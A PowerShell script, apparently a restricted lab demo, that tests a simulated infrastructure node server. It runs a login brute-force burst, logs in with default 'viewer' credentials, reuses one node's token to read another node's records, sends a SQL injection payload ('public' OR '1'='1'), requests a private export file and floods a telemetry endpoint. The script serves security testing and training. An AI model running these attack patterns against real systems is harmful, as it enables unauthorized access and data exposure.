param(
    [Parameter(Mandatory=$true)][string]$ServerIP,
    [int]$Port=8006,
    [ValidateSet('Probe','LoginAttempts','Login','RecordAccess','QueryExposure','FileAccess','RateBurst')][string]$Action='Probe'
)
$ErrorActionPreference='Stop'
$address=$null
if (-not [System.Net.IPAddress]::TryParse($ServerIP,[ref]$address)) { throw 'Use a literal private IPv4 address, not a URL or hostname.' }
$bytes=$address.GetAddressBytes()
$private=$address.AddressFamily -eq [System.Net.Sockets.AddressFamily]::InterNetwork -and ($bytes[0] -eq 10 -or $bytes[0] -eq 127 -or ($bytes[0] -eq 192 -and $bytes[1] -eq 168) -or ($bytes[0] -eq 172 -and $bytes[1] -ge 16 -and $bytes[1] -le 31))
if (-not $private -or $Port -lt 1024 -or $Port -gt 65535) { throw 'This bounded demo supports only your private IPv4/loopback server and an explicit unprivileged port.' }
$base="http://${ServerIP}:$Port"
function Call-Node([string]$Path,[object]$Body=$null,[hashtable]$Headers=@{}) {
    try {
        $params=@{Uri="$base$Path";TimeoutSec=5;Headers=$Headers}
        if ($null -ne $Body) { $params.Method='Post';$params.ContentType='application/json';$params.Body=($Body|ConvertTo-Json -Compress) }
        $result=Invoke-RestMethod @params
        Write-Host 'HTTP 200'
        return $result
    } catch {
        if ($_.Exception.Response) { Write-Host "Denied/failed: HTTP $([int]$_.Exception.Response.StatusCode)" }
        else { Write-Host 'Connection failed. Check private LAN connectivity and the target port.' }
        return $null
    }
}
switch ($Action) {
    'Probe' { Call-Node '/health' | ConvertTo-Json }
    'LoginAttempts' { for($attempt=0;$attempt -lt 6;$attempt++){ $null=Call-Node '/nodes/PWR-001/login' @{username='viewer';password='incorrect-demo-only'}; Start-Sleep -Milliseconds 150 } }
    'Login' { $r=Call-Node '/nodes/PWR-001/login' @{username='viewer';password='viewer'}; if($r){Write-Host 'Node viewer session accepted. No host/SOC access.'} }
    'RecordAccess' {
        $r=Call-Node '/nodes/PWR-001/login' @{username='viewer';password='viewer'}
        if($r){ Call-Node '/nodes/PWR-008/records/1002' $null @{Authorization="Bearer $($r.token)"} | ConvertTo-Json }
    }
    'QueryExposure' { Call-Node ('/nodes/WTR-005/history?q='+[uri]::EscapeDataString("public' OR '1'='1")) | ConvertTo-Json -Depth 4 }
    'FileAccess' { Call-Node '/nodes/HLT-008/export?name=private-maintenance.txt' | ConvertTo-Json }
    'RateBurst' { for($attempt=0;$attempt -lt 12;$attempt++){ $null=Call-Node '/nodes/PWR-005/telemetry'; Start-Sleep -Milliseconds 100 } }
}
Write-Host 'Review actual evidence on laptop 1. A denial is a defensive result, not proof of successful compromise.'
